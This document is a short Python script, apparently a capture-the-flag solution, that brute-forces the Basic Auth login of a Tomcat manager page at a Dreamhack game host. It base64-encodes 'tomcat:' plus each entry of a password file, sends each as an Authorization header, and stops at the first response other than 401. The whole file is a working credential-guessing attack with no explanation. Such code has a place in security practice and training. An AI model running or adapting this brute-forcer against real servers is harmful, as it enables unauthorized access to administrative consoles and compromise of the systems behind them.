import requests, base64

f = open('./passwords.txt', 'r')
lines = f.readlines()
counts = len(lines)
i = 0

for line in lines:
    line = line.strip()
    tokenRaw = 'tomcat:' + line
    tokenBytes = tokenRaw.encode('ascii')
    authToken = base64.b64encode(tokenBytes)
    authTokenStr = authToken.decode('ascii')
    
    url = 'http://host1.dreamhack.games:20991/manager/html'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'host1.dreamhack.games:20991',
        'Authorization': 'Basic ' + authTokenStr,
    }
    res = requests.get(url, headers=headers)
    if res.status_code != 401:
        print('[' + str(i) + '/' + str(counts) + '] ')
        print('[+] Success: ' + line + ': ' + authTokenStr)
        break
    else:
        print('[' + str(i) + '/' + str(counts) + '] ')
        print('[-] Failed: ' + line + ': ' + authTokenStr)
    i += 1